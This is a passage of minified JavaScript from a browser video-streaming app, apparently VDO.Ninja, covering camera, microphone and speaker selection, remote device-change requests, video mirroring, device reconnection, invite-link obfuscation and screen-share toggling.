input[type='checkbox']").forEach((function(item){if(event.currentTarget.value!==item.value)for(item.checked=!1,"screen"==item.dataset.type&&item.parentElement.parentElement.removeChild(item.parentElement);SelectedAudioInputDevices.indexOf(item.value)>-1;)SelectedAudioInputDevices.splice(SelectedAudioInputDevices.indexOf(item.value),1);else item.checked=!0,-1==SelectedAudioInputDevices.indexOf(event.currentTarget.value)&&(SelectedAudioInputDevices.length&&SelectedAudioInputDevices.includes("ZZZ")&&(SelectedAudioInputDevices=[]),SelectedAudioInputDevices.push(event.currentTarget.value))})),saveSettings()};else if("videoinput"===deviceInfo.kind){(option=document.createElement("option")).value=deviceInfo.deviceId||"default",option.text=deviceInfo.label||`camera ${videoSelect.length+1}`;try{!knownTrack&&session.canvasSource&&session.canvasSource.srcObject.getVideoTracks().forEach((function(track){option.text==track.label&&(option.selected="true",knownTrack=!0)})),!knownTrack&&session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){option.text==track.label&&(option.selected="true",knownTrack=!0)}))}catch(e){errorlog(e)}videoSelect.appendChild(option)}else if("audiooutput"===deviceInfo.kind){var option=document.createElement("option");0===audioOutputSelect.length?option.dataset.default=!0:option.dataset.default=!1,option.value=deviceInfo.deviceId||"default",option.value==session.sink?option.selected="true":!session.sink&&SelectedAudioOutputDevices&&SelectedAudioOutputDevices==option.value&&(option.selected="true",session.sink=option.value),option.text=deviceInfo.label||`Speaker ${audioOutputSelect.length+1}`,audioOutputSelect.appendChild(option)}else log("Some other kind of source/device: ",deviceInfo)}if(Firefox&&!session.mobile)(option=document.createElement("option")).value="others",option.text="Show more options",audioOutputSelect.appendChild(option);if(0==audioOutputSelect.childNodes.length)(option=document.createElement("option")).value="default",option.text="System Default",audioOutputSelect.appendChild(option);videoSelect.childNodes.length<=1?(getById("flipcamerabutton").style.display="none",getById("flipcamerabutton").dataset.maxndex=videoSelect.childNodes.length):(getById("flipcamerabutton").style.display="unset",getById("flipcamerabutton").dataset.maxIndex=videoSelect.childNodes.length),session.streamSrc.getAudioTracks().forEach((function(track){log("Checking for screenshare audio");for(var matched=!1,i=0;i!==deviceInfos.length;++i){var deviceInfo=deviceInfos[i];null!=deviceInfo&&(log("---"),track.label!=deviceInfo.label||(matched=!0))}if(0==matched){var listele=document.createElement("li");listele.style.display="block";var option=document.createElement("input");option.type="checkbox",option.value=track.id,option.checked=!0,option.style.display="none",option.name=track.label,option.label=track.label,option.dataset.type="screen";var label=document.createElement("label");label.for=option.name,label.innerHTML=" "+track.label,listele.appendChild(option),listele.appendChild(label),option.onchange=function(event){log("change 4873");var trackid=null;return CtrlPressed?"screen"==event.currentTarget.dataset.type&&event.currentTarget.parentElement.parentElement.removeChild(event.currentTarget.parentElement):document.querySelectorAll("#audioSource3 input[type='checkbox']").forEach((function(item){event.currentTarget.value!==item.value?(item.checked=!1,"screen"==item.dataset.type&&item.parentElement.parentElement.removeChild(item.parentElement)):(event.currentTarget.checked=!0,trackid=item.value)})),activatedPreview=!1,grabAudio("#audioSource3",trackid),event.stopPropagation(),!1},audioInputSelect.appendChild(listele)}}));var label,optionss=!1;if(screensharesupport&&((optionss=document.createElement("option")).text="Screen Share (replace camera)",optionss.value="XXX",videoSelect.appendChild(optionss)),(option=document.createElement("option")).text="Disable Video",option.value="ZZZ",videoSelect.appendChild(option),0==session.streamSrc.getVideoTracks().length)option.selected="true";else if(0==knownTrack){(option=document.createElement("option")).text=session.streamSrc.getVideoTracks()[0].label,option.value="YYY",videoSelect.appendChild(option),option.selected="true"}optionss&&(optionss.lastSelected=videoSelect.selectedIndex),videoSelect.onchange=function(event){try{if("XXX"===event.target.options[event.target.options.selectedIndex].value)return videoSelect.selectedIndex=event.target.options[event.target.options.selectedIndex].lastSelected,void(0==session.screenShareState?toggleScreenShare():toggleScreenShare(!0))}catch(e){}activatedPreview=!1,grabVideo(session.quality,"videosource","select#videoSource3"),getById("audioSource3").querySelectorAll("input[data-type='screen']").length||(session.screenShareState&&(session.screenShareState=!1,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare()),getById("screensharebutton").classList.remove("green"),getById("screensharebutton").ariaPressed="false")},(option=document.createElement("input")).type="checkbox",option.value="ZZZ",option.style.display="none",option.id="audioSourceNoAudio2",(label=document.createElement("label")).for=option.name,label.innerHTML=" No Audio";var listele=document.createElement("li");0==session.streamSrc.getAudioTracks().length?option.checked=!0:(listele.style.display="none",option.checked=!1),option.onchange=function(event){log("change 4938"),CtrlPressed?document.querySelectorAll("#audioSource3 input[type='checkbox']").forEach((function(item){if(event.currentTarget.value===item.value)event.currentTarget.checked=!0,-1==SelectedAudioInputDevices.indexOf(event.currentTarget.value)&&(SelectedAudioInputDevices.length&&SelectedAudioInputDevices.includes("ZZZ")&&(SelectedAudioInputDevices=[]),SelectedAudioInputDevices.push(event.currentTarget.value));else for(item.checked=!1,"screen"==item.dataset.type&&item.parentElement.parentElement.removeChild(item.parentElement);SelectedAudioInputDevices.indexOf(item.value)>-1;)SelectedAudioInputDevices.splice(SelectedAudioInputDevices.indexOf(item.value),1)})):document.querySelectorAll("#audioSource3 input[type='checkbox']").forEach((function(item){if(event.currentTarget.value!==item.value)for(item.checked=!1,"screen"==item.dataset.type&&item.parentElement.parentElement.removeChild(item.parentElement);SelectedAudioInputDevices.indexOf(item.value)>-1;)SelectedAudioInputDevices.splice(SelectedAudioInputDevices.indexOf(item.value),1);else item.checked=!0,-1==SelectedAudioInputDevices.indexOf(event.currentTarget.value)&&(SelectedAudioInputDevices.length&&SelectedAudioInputDevices.includes("ZZZ")&&(SelectedAudioInputDevices=[]),SelectedAudioInputDevices.push(event.currentTarget.value))})),saveSettings()},listele.appendChild(option),listele.appendChild(label),audioInputSelect.appendChild(listele),audioInputSelect.onchange=function(){log("Audio OPTION HAS CHANGED? 2"),activatedPreview=!1,setTimeout((function(){grabAudio("#audioSource3")}),10)},getById("refreshVideoButton").onclick=function(){refreshVideoDevice()},Firefox&&!session.mobile&&(audioOutputSelect.onclick=function(){log("audioOutputSelect.onclick = function() {"),"others"===audioOutputSelect.options[audioOutputSelect.selectedIndex].value&&(log("Trying to increase the output device list"),navigator.mediaDevices.selectAudioOutput().then((device=>{if("audiooutput"==device.kind){session.sink=device.deviceId;try{var matched=!1;if(audioOutputSelect.childNodes.forEach((ele=>{ele.value===device.deviceId&&(matched=!0,ele.selected=!0)})),!matched){var option=document.createElement("option");option.value=device.deviceId,option.text=device.label,audioOutputSelect.appendChild(option),option.selected=!0}saveSettings()}catch(e){errorlog(e)}if(!session.sink)return;resetupAudioOut()}})))}),audioOutputSelect.onchange=function(){if(log("audioOutputSelect.onchange = function() {"),!iOS&&!iPad&&(!Firefox||session.mobile||"others"!==audioOutputSelect.options[audioOutputSelect.selectedIndex].value)){try{session.sink=audioOutputSelect.options[audioOutputSelect.selectedIndex].value,saveSettings()}catch(e){errorlog(e)}session.sink&&(resetupAudioOut(),log("done audioOutputSelect.onchange = function() {"))}}}catch(e){errorlog(e)}}function refreshVideoDevice(){session.screenShareState?log("can't refresh a screenshare"):(log("video source changed"),activatedPreview=!1,grabVideo(session.quality,"videosource","select#videoSource3"))}function gotDevicesRemote(deviceInfos,UUID){try{if(document.getElementById("remoteVideoSelect_"+UUID)){var length=(videoSelect=document.getElementById("remoteVideoSelect_"+UUID)).options.length;for(i=length-1;i>=0;i--)videoSelect.options[i]=null}else{var videoSelect;(videoSelect=document.createElement("select")).id="remoteVideoSelect_"+UUID,videoSelect.onchange=function(){session.rpcs[UUID].stats.info&&session.rpcs[UUID].stats.info.consent?(getById("requestVideoDevice_"+UUID).innerHTML='<i class="las la-video"></i> apply',getById("requestVideoDevice_"+UUID).title="This will update the remote device to the selected one"):(getById("requestVideoDevice_"+UUID).innerHTML='<i class="las la-video"></i> request',getById("requestVideoDevice_"+UUID).title="This will ask the remote guest for permission to change")},(buttonGO=document.createElement("button")).innerHTML='<i class="las la-video"></i> refresh',buttonGO.title="This will refresh the current device",buttonGO.id="requestVideoDevice_"+UUID,buttonGO.onclick=function(){var data={};data.changeCamera=videoSelect.value,data.UUID=UUID,session.sendRequest(data,UUID)};var videoSelectDiv=document.createElement("div");query("#container_"+UUID+" .advancedVideoSettings").appendChild(videoSelectDiv),videoSelectDiv.appendChild(videoSelect),videoSelectDiv.appendChild(buttonGO)}if(document.getElementById("remoteAudioSelect_"+UUID)){log("remoteAudioSelect_ ");length=(audioSelect=document.getElementById("remoteAudioSelect_"+UUID)).options.length;for(i=length-1;i>=0;i--)audioSelect.options[i]=null}else{var audioSelect;(audioSelect=document.createElement("select")).id="remoteAudioSelect_"+UUID,audioSelect.onchange=function(){log("ON CHANGE"),session.rpcs[UUID].stats.info&&session.rpcs[UUID].stats.info.consent?(getById("requestAudioDevice_"+UUID).innerHTML='<i class="las la-microphone-alt"></i> apply',getById("requestAudioDevice_"+UUID).title="This will update the remote device to the selected one"):(getById("requestAudioDevice_"+UUID).innerHTML='<i class="las la-microphone-alt"></i> request',getById("requestAudioDevice_"+UUID).title="This will ask the remote guest for permission to change")},(buttonGO=document.createElement("button")).innerHTML='<i class="las la-microphone-alt"></i> refresh',buttonGO.title="This will refresh the current device",buttonGO.id="requestAudioDevice_"+UUID,buttonGO.onclick=function(){var data={};data.changeMicrophone=audioSelect.value,data.UUID=UUID,session.sendRequest(data,UUID)};var audioSelectDiv=document.createElement("div");query("#container_"+UUID+" .advancedAudioSettings").appendChild(audioSelectDiv),audioSelectDiv.appendChild(audioSelect),audioSelectDiv.appendChild(buttonGO)}if(document.getElementById("remoteAudioOutputSelect_"+UUID)){length=(audioOutputSelect=document.getElementById("remoteAudioOutputSelect_"+UUID)).options.length;for(i=length-1;i>=0;i--)audioOutputSelect.options[i]=null}else{var audioOutputSelect,buttonGO;(audioOutputSelect=document.createElement("select")).id="remoteAudioOutputSelect_"+UUID,audioOutputSelect.onchange=function(){session.rpcs[UUID].stats.info&&session.rpcs[UUID].stats.info.consent?(getById("requestAudioOutputDevice_"+UUID).innerHTML='<i class="las la-headphones"></i> apply',getById("requestAudioOutputDevice_"+UUID).title="This will update the remote device to the selected one"):(getById("requestAudioOutputDevice_"+UUID).innerHTML='<i class="las la-headphones"></i> request',getById("requestAudioOutputDevice_"+UUID).title="This will ask the remote guest for permission to change")},(buttonGO=document.createElement("button")).innerHTML='<i class="las la-headphones"></i> refresh',buttonGO.title="This will refresh the current device",buttonGO.id="requestAudioOutputDevice_"+UUID,buttonGO.onclick=function(){var data={};data.changeSpeaker=audioOutputSelect.value,data.UUID=UUID,session.sendRequest(data,UUID)};var audioOutputSelectContainer=document.createElement("div");query("#container_"+UUID+" .advancedAudioSettings").appendChild(audioOutputSelectContainer),audioOutputSelectContainer.appendChild(audioOutputSelect),audioOutputSelectContainer.appendChild(buttonGO)}var matched=!1;for(let i=0;i!==deviceInfos.length;++i){const deviceInfo=deviceInfos[i];if(null!=deviceInfo)if("videoinput"===deviceInfo.kind){const option=document.createElement("option");option.value=deviceInfo.deviceId||"default",option.text=deviceInfo.label||`camera ${videoSelect.length+1}`,getById("remoteVideoLabel_"+UUID).innerText==option.text&&(option.selected="true",matched=!0),videoSelect.appendChild(option)}else if("audioinput"===deviceInfo.kind){const option=document.createElement("option");option.value=deviceInfo.deviceId||"default",option.text=deviceInfo.label||`microphone ${audioSelect.length+1}`,getById("remoteAudioLabel_"+UUID).innerText==option.text&&(option.selected="true"),audioSelect.appendChild(option)}else if("audiooutput"===deviceInfo.kind){const option=document.createElement("option");option.value=deviceInfo.deviceId||"default",option.text=deviceInfo.label||`microphone ${audioOutputSelect.length+1}`,getById("remoteAudioOutputSelect_"+UUID).innerText==option.text&&(option.selected="true"),audioOutputSelect.appendChild(option)}}matched?(getById("requestVideoDevice_"+UUID).innerHTML='<i class="las la-video"></i> refresh',getById("requestVideoDevice_"+UUID).title="This will reconnect the guest's active video source."):(getById("requestVideoDevice_"+UUID).innerHTML='<i class="las la-video"></i> request',getById("requestVideoDevice_"+UUID).title="This will ask the remote guest for permission to change")}catch(e){errorlog(e)}pokeIframeAPI("remote-devices-info",deviceInfos,UUID)}var timeoutTone=!1;function playtone(screen=!1,tonename="testtone"){if(!timeoutTone)if(setTimeout((function(){timeoutTone=!1}),500),timeoutTone=!0,iOS||iPad){(toneEle=document.getElementById(tonename))&&(toneEle.mute,toneEle.play())}else{if(screen)try{var outputSelect=getById("outputSourceScreenshare");outputSelect&&(session.sink=outputSelect.options[outputSelect.selectedIndex].value,saveSettings())}catch(e){errorlog(e)}var toneEle;if(toneEle=document.getElementById(tonename))if(session.sink)try{toneEle.setSinkId(session.sink).then((()=>{log("changing audio sink:"+session.sink),toneEle.play()})).catch((error=>{warnlog(error)}))}catch(e){warnlog(e),toneEle.play()}else toneEle.play()}}function showNotification(title,body=""){if(Notification)if("granted"!==Notification.permission)Notification.requestPermission();else{let notification=new Notification(title,{body:body,icon:"/media/old_icon.png"});notification.onclick=()=>{notification.close(),window.parent.focus()}}}async function getAudioOnly(selector,trackid=null,override=!1){var audioSelect=document.querySelector(selector).querySelectorAll("input,option"),audioList=[],streams=[];log("getAudioOnly()");for(var i=0;i<audioSelect.length;i++)"ZZZ"!=audioSelect[i].value&&trackid!=audioSelect[i].value&&"screen"!=audioSelect[i].dataset.type&&(audioSelect[i].checked||audioSelect[i].selected)&&(log(audioSelect[i]),audioList.push(audioSelect[i]));for(i=0;i<audioList.length;i++){if(!1!==session.echoCancellation&&!1!==session.autoGainControl&&!1!==session.noiseSuppression)var constraint={audio:{deviceId:{exact:audioList[i].value}}};else{constraint={audio:{deviceId:{exact:audioList[i].value}}};!1===session.echoCancellation?constraint.audio.echoCancellation=!1:constraint.audio.echoCancellation=!0,!1===session.autoGainControl?constraint.audio.autoGainControl=!1:constraint.audio.autoGainControl=!0,!1===session.noiseSuppression?constraint.audio.noiseSuppression=!1:constraint.audio.noiseSuppression=!0}constraint.video=!1,!1!==override&&(log("Override true"),override.audio&&override.audio.deviceId?audioList[i].value==override.audio.deviceId&&(constraint=override):constraint=override),audioList[i].value&&SelectedAudioInputDevices&&-1===SelectedAudioInputDevices.indexOf(audioList[i].value)&&(SelectedAudioInputDevices.length&&SelectedAudioInputDevices.includes("ZZZ")&&(SelectedAudioInputDevices=[]),SelectedAudioInputDevices.push(audioList[i].value)),session.audioInputChannels&&(!0===constraint.audio?(constraint.audio={},constraint.audio.channelCount=session.audioInputChannels):constraint.audio&&(constraint.audio.channelCount=session.audioInputChannels)),session.micSampleRate&&(!0===constraint.audio?(constraint.audio={},constraint.audio.sampleRate=parseInt(session.micSampleRate)):constraint.audio&&(constraint.audio.sampleRate=parseInt(session.micSampleRate))),session.micSampleSize&&(!0===constraint.audio?(constraint.audio={},constraint.audio.sampleSize=parseInt(session.micSampleSize)):constraint.audio&&(constraint.audio.sampleSize=parseInt(session.micSampleSize))),log("CONSTRAINT"),log(constraint),warnlog("navigator.mediaDevices.getUserMedia starting...");var stream=await navigator.mediaDevices.getUserMedia(constraint).then((function(stream2){return log("get audio sucecss"),pokeIframeAPI("local-microphone-event"),stream2})).catch((function(err){return warnlog(err),session.cleanOutput||!1!==override&&err.name&&err.constraint&&warnUser(err.name+": "+err.constraint),!1}));stream&&streams.push(stream)}return streams}function applyMirror(mirror){if(session.videoElement)try{var transFlip="",transNorm="";document.getElementById("videosource")&&session.windowed&&(transFlip=" translate(0, 50%)",transNorm=" translate(0, -50%)"),(2==session.mirrored||0===session.mirrored)&&(mirror=!0),session.videoElement.style||(session.videoElement.style=""),session.permaMirrored&&(mirror=!mirror),mirror?session.mirrored&&session.flipped?(session.videoElement.style.transform="scaleX(-1) scaleY(-1)"+transFlip,session.videoElement.classList.add("mirrorControl")):session.mirrored?(session.videoElement.style.transform="scaleX(-1)"+transNorm,session.videoElement.classList.add("mirrorControl")):session.flipped?(session.videoElement.style.transform="scaleY(-1) scaleX(1)"+transFlip,session.videoElement.classList.remove("mirrorControl")):(session.videoElement.style.transform="scaleX(1)"+transNorm,session.videoElement.classList.remove("mirrorControl")):session.mirrored&&session.flipped?(session.videoElement.style.transform="scaleX(1) scaleY(-1)"+transFlip,session.videoElement.classList.remove("mirrorControl")):session.mirrored?(session.videoElement.style.transform="scaleX(1)"+transNorm,session.videoElement.classList.remove("mirrorControl")):session.flipped?(session.videoElement.style.transform="scaleY(-1) scaleX(-1)"+transFlip,session.videoElement.classList.add("mirrorControl")):(session.videoElement.style.transform="scaleX(-1)"+transNorm,session.videoElement.classList.add("mirrorControl"));var rotate=0;if(!1!==session.forceRotate?(rotate=session.rotate?-1*session.forceRotate+parseInt(session.rotate):-1*session.forceRotate,session.forceRotate&&(rotate+=180)):rotate=session.rotate,rotate&&rotate>=360&&(rotate-=360),session.videoElement.rotated=rotate,document.getElementById("previewWebcam")||document.getElementById("videosource")){var eleName=document.getElementById("previewWebcam")||document.getElementById("videosource");rotate?(eleName.style.transform?eleName.style.transform+=" rotate("+rotate+"deg)":eleName.style.transform="rotate("+rotate+"deg)",eleName.classList.add("rotate")):eleName.classList.remove("rotate")}else if(document.getElementById("container"))0==rotate?(document.getElementById("container").classList.remove("rotate"),document.getElementById("container").style.transform="unset",document.getElementById("container").style.transformOrigin="unset"):document.getElementById("container").style.transform="rotate("+rotate+"deg)";else if(document.getElementById("minipreview")){eleName=document.getElementById("minipreview");90==rotate?(eleName.style.transform="rotate(90deg)",eleName.style.transformOrigin="50% 100%",eleName.style.height=eleName.style.width,eleName.style.width="unset"):270==session.videoElement.rotated?(eleName.style.transform="rotate(270deg)",eleName.style.transformOrigin="50% 100%",eleName.style.width="unset",eleName.style.height=eleName.style.width):180==session.videoElement.rotated?(eleName.style.transform="rotate(180deg)",eleName.style.transformOrigin="unset"):(eleName.classList.remove("rotate"),eleName.style.transform="unset",eleName.style.transformOrigin="unset")}}catch(e){errorlog(e)}}function applyMirrorGuest(mirror,videoElement){try{mirror?(videoElement.style.transform="scaleX(-1)",videoElement.classList.add("mirrorControl")):(videoElement.style.transform="scaleX(1)",videoElement.classList.remove("mirrorControl"))}catch(e){errorlog(e)}}function cleanupMediaTracks(){getUserMediaRequestID+=1;try{session.streamSrcClone&&session.streamSrcClone.getTracks().forEach((function(track){session.streamSrcClone.removeTrack(track),track.stop(),log("stopping old track")})),session.streamSrc?session.streamSrc.getTracks().forEach((function(track){session.streamSrc.removeTrack(track),track.stop(),log("stopping old track")})):checkBasicStreamsExist(),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getTracks().forEach((function(track){session.videoElement.srcObject.removeTrack(track),track.stop(),log("stopping old track")})):session.videoElement.srcObject=createMediaStream(),activatedPreview=!1}catch(e){errorlog(e)}}var lastAudioDevice=null,lastVideoDevice=null,lastPlaybackDevice=null,audioReconnectTimeout=null,videoReconnectTimeout=null,grabDevicesTimeout=null,playbackReconnectTimeout=null;function reconnectDevices(event){try{session.firstPlayTriggered&&"suspended"==session.audioCtx.state&&session.audioCtx.resume()}catch(e){warnlog("session.audioCtx.resume(); failed")}if(warnlog("A media device has changed"),!iOS&&!iPad){if(document.getElementById("previewWebcam"))return clearTimeout(playbackReconnectTimeout),void(playbackReconnectTimeout=setTimeout((function(){document.getElementById("previewWebcam")&&enumerateDevices().then(gotDevices).then((function(){document.getElementById("previewWebcam")&&resetupAudioOut(document.getElementById("previewWebcam"))}))}),1e3));try{session.streamSrc?(session.streamSrc.getTracks().forEach((function(track){"ended"==track.readyState&&("audio"==track.kind?lastAudioDevice=track.label:"video"==track.kind&&(lastVideoDevice=track.label),session.streamSrc.removeTrack(track),log("remove ended old track"))})),session.streamSrcClone&&session.streamSrcClone.getTracks().forEach((function(track){"ended"==track.readyState&&(session.streamSrcClone.removeTrack(track),track.stop())})),session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getTracks().forEach((function(track){"ended"==track.readyState&&(session.videoElement.srcObject.removeTrack(track),log("remove ended old track"))}))):checkBasicStreamsExist()}catch(e){errorlog(e)}clearTimeout(audioReconnectTimeout),audioReconnectTimeout=null,lastAudioDevice&&(audioReconnectTimeout=setTimeout((function(){enumerateDevices().then(gotDevices2).then((function(){for(var streamConnected=!1,audioSelect=getById("audioSource3").querySelectorAll("input"),i=0;i<audioSelect.length;i++)if("ZZZ"!=audioSelect[i].value&&audioSelect[i].checked){log("checked"),streamConnected=!0;break}if(!streamConnected)for(i=0;i<audioSelect.length;i++)if("ZZZ"!=audioSelect[i].value&&lastAudioDevice==audioSelect[i].dataset.label){audioSelect[i].checked=!0,streamConnected=!0,lastAudioDevice=null,warnlog("DISCONNECTED AUDIO DEVICE RECONNECTED");break}activatedPreview=!1,grabAudio("#audioSource3"),setTimeout((function(){enumerateDevices().then(gotDevices2).then((function(){}))}),1e3)}))}),2e3)),clearTimeout(videoReconnectTimeout),videoReconnectTimeout=null,lastVideoDevice&&(videoReconnectTimeout=setTimeout((function(){enumerateDevices().then(gotDevices2).then((function(){var streamConnected=!1,videoSelect=getById("videoSource3");if(errorlog(videoSelect.value),"ZZZ"==videoSelect.value)for(var i=0;i<videoSelect.options.length;i++)try{if(videoSelect.options[i].innerHTML==lastVideoDevice){videoSelect.options[i].selected="true",streamConnected=!0,lastVideoDevice=null;break}}catch(e){errorlog(e)}streamConnected&&(activatedPreview=!1,grabVideo(session.quality,"videosource","select#videoSource3"),setTimeout((function(){enumerateDevices().then(gotDevices2).then((function(){}))}),1e3))}))}),2e3)),clearTimeout(playbackReconnectTimeout),playbackReconnectTimeout=setTimeout((function(){enumerateDevices().then(gotDevices2).then((function(){resetupAudioOut()}))}),1e3)}}var vingesterFixed=!1;function resetupAudioOut(ele=!1,forceReset=!1){if(log("resetupAudioOut"),iOS||iPad||SafariVersion||ChromiumVersion&&session.mobile){if(ele)return;for(var UUID in session.rpcs)if(session.rpcs[UUID].videoElement)try{session.rpcs[UUID].videoElement.pause().then((()=>{setTimeout((function(uuid){log("win");try{session.rpcs[uuid].videoElement.play().then((()=>{log("toggle pause/play")}))}catch(e){errorlog(e)}}),0,UUID)})).catch(errorlog)}catch(e){warnlog(e)}}else{var outputSelect=document.getElementById("outputSource")||document.getElementById("outputSource3")||!1,sinkSet=!1;try{!session.sink&&!vingesterFixed&&document.getElementById("testtone")&&document.getElementById("testtone").sinkId&&isVingester&&(vingesterFixed=!0,session.sink=document.getElementById("testtone").sinkId)}catch(e){errorlog(e)}if(outputSelect&&outputSelect.options&&outputSelect.options.length){for(var i=0;i<outputSelect.options.length;i++)outputSelect.options[i].value==session.sink&&(outputSelect.options[i].selected="true",sinkSet=!0);0==sinkSet?outputSelect.options[0]&&(outputSelect.options[0].selected="true",sinkSet=outputSelect.value):sinkSet=session.sink}else sinkSet=session.sink;if(ele){try{var eleSink=sinkSet;ele.manualSink&&(eleSink=ele.manualSink,log("Manual Sink Identified")),eleSink&&(forceReset&&ele.setSinkId("default").then((()=>{ele.setSinkId(eleSink).then((()=>{log("New Output Device")})).catch((error=>{Firefox||warnlog(error)}))})).catch((error=>{Firefox||errorlog(error),ele.setSinkId(eleSink).then((()=>{log("New Output Device")})).catch((error=>{Firefox||warnlog(error)}))})),ele.setSinkId(eleSink).then((()=>{log("New Output Device for self-preview")})).catch((error=>{Firefox||(warnlog("Need to add mic support, and grab it if needed."),warnlog(error))})))}catch(e){warnlog("can't use setsink")}log("audio sink: "+eleSink)}else{if(session.videoElement)try{eleSink=sinkSet;session.videoElement.manualSink&&(eleSink=session.videoElement.manualSink),eleSink&&session.videoElement.setSinkId(eleSink).then((()=>{log("New Output Device for self-preview")})).catch((error=>{Firefox||warnlog(error)}))}catch(e){warnlog("can't use setsink")}for(UUID in session.rpcs)try{if(session.rpcs[UUID].videoElement){eleSink=sinkSet;session.rpcs[UUID].videoElement.manualSink&&(eleSink=session.rpcs[UUID].videoElement.manualSink),eleSink&&session.rpcs[UUID].videoElement.setSinkId(eleSink).then((()=>{log("New Output Device for: "+UUID)})).catch((error=>{Firefox||warnlog(error)}))}}catch(e){warnlog(e)}log("audio sink 2: "+eleSink)}}}function obfuscateURL(input){input.startsWith("https://obs.ninja/")?input=input.replace("https://obs.ninja/","obs.ninja/"):input.startsWith("http://obs.ninja/")?input=input.replace("http://obs.ninja/","obs.ninja/"):input.startsWith("obs.ninja/")?input=input.replace("obs.ninja/","obs.ninja/"):input.startsWith("https://vdo.ninja/")?input=input.replace("https://vdo.ninja/","vdo.ninja/"):input.startsWith("http://vdo.ninja/")?input=input.replace("http://vdo.ninja/","vdo.ninja/"):input.startsWith("vdo.ninja/")&&(input=input.replace("vdo.ninja/","vdo.ninja/")),input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=(input=input.replace("&view=","&v=")).replace("&view&","&v&")).replace("?view&","?v&")).replace("?view=","?v=")).replace("&videobitrate=","&vb=")).replace("?videobitrate=","?vb=")).replace("&bitrate=","&vb=")).replace("?bitrate=","?vb=")).replace("?audiodevice=","?ad=")).replace("&audiodevice=","&ad=")).replace("?label=","?l=")).replace("&label=","&l=")).replace("?stereo=","?s=")).replace("&stereo=","&s=")).replace("&stereo&","&s&")).replace("?stereo&","?s&")).replace("?webcam&","?wc&")).replace("&webcam&","&wc&")).replace("?remote=","?rm=")).replace("&remote=","&rm=")).replace("?password=","?p=")).replace("&password=","&p=")).replace("&maxvideobitrate=","&mvb=")).replace("?maxvideobitrate=","?mvb=")).replace("&maxbitrate=","&mvb=")).replace("?maxbitrate=","?mvb=")).replace("&height=","&h=")).replace("?height=","?h=")).replace("&width=","&w=")).replace("?width=","?w=")).replace("&quality=","&q=")).replace("?quality=","?q=")).replace("&cleanoutput=","&clean=")).replace("?cleanoutput=","?clean=")).replace("&maxviewers=","&clean=")).replace("?maxviewers=","?clean=")).replace("&frameRate=","&fr=")).replace("?frameRate=","?fr=")).replace("&fps=","&fr=")).replace("?fps=","?fr=")).replace("&roomid=","&r=")).replace("?roomid=","?r=")).replace("&room=","&r=")).replace("?room=","?r="),log(input);return"https://invite.cam/"+CryptoJS.AES.encrypt(input,"OBSNINJAFORLIFE").toString()}function notifyOfScreenShare(){if(session.notifyScreenShare){var data={};data.screenShareState=session.screenShareState,session.sendMessage(data)}}var beforeScreenShare=null,screenShareAudioTrack=null;async function toggleScreenShare(reload=!1){var quality=session.quality_ss;if(!1===quality&&(quality=session.quality_wb),!1!==session.quality&&(quality=session.quality),!1!==session.screensharequality&&(quality=session.screensharequality),reload)await grabScreen(quality,!0,!0).then((res=>{0!=res&&(session.screenShareState=!0,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare(),getById("screensharebutton").classList.add("green"),getById("screensharebutton").ariaPressed="true",enumerateDevices().then(gotDevices2).then((function(){})))}));else if(0==session.screenShareState)await grabScreen(quality,!0,!0).then((res=>{0!=res&&(session.screenShareState=!0,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare(),getById("screensharebutton").classList.add("green"),getById("screensharebutton").ariaPressed="true",enumerateDevices().then(gotDevices2).then((function(){})),session.videoElement.play().then((()=>{log("start play doublecheck")})),updateMixer(),pokeIframeAPI("screen-share-state",!0))}));else{session.screenShareState=!1,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare(),session.streamSrc||checkBasicStreamsExist(),screenShareAudioTrack&&(session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getAudioTracks().forEach((function(track){screenShareAudioTrack.id==track.id&&(session.videoElement.srcObject.removeTrack(track),track.stop())})),session.streamSrcClone&&session.streamSrcClone.getAudioTracks().forEach((function(track){screenShareAudioTrack.id==track.id&&(session.streamSrcClone.removeTrack(track),track.stop())})),session.streamSrc&&session.streamSrc.getAudioTracks().forEach((function(track){screenShareAudioTrack.id==track.id&&(session.streamSrc.removeTrack(track),track.stop())})),session.videoElement.srcObject=outboundAudioPipeline(),screenShareAudioTrack=null,senderAudioUpdate());var addedAlready=!1;session.streamSrc&&session.streamSrc.getVideoTracks().forEach((function(track){beforeScreenShare&&track.id==beforeScreenShare.id?addedAlready=!0:(session.streamSrc.removeTrack(track),track.stop())})),session.streamSrcClone&&session.streamSrcClone.getVideoTracks().forEach((function(track){beforeScreenShare&&track.id==beforeScreenShare.id||(session.streamSrcClone.removeTrack(track),track.stop())})),session.videoElement&&session.videoElement.srcObject&&session.videoElement.srcObject.getVideoTracks().forEach((function(track){beforeScreenShare&&track.id==beforeScreenShare.id?addedAlready=!0:(session.videoElement.srcObject.removeTrack(track),track.stop())})),getById("screensharebutton").classList.remove("green"),getById("screensharebutton").ariaPressed="false",beforeScreenShare&&0==addedAlready&&session.streamSrc.addTrack(beforeScreenShare),beforeScreenShare=null,updateRenderOutpipe(),toggleSettings(!0),updateMixer()}}var ipcRenderer=!1,ElectronDesktopCapture=!1;if(navigator.userAgent.toLowerCase().indexOf(" electron/")>-1)try{ipcRenderer||(ipcRenderer=require("electron").ipcRenderer),window.navigator.mediaDevices.getDisplayMedia=(constraints=!1)=>new Promise((async(resolve,reject)=>{try{if(session.autostart)if(session.autostart=!1,parseInt(session.screenshare)+""===session.screenshare){(sscid=parseInt(session.screenshare)-1)<0&&(sscid=0);const sources=await ipcRenderer.sendSync("getSources",{types:["screen"]});var 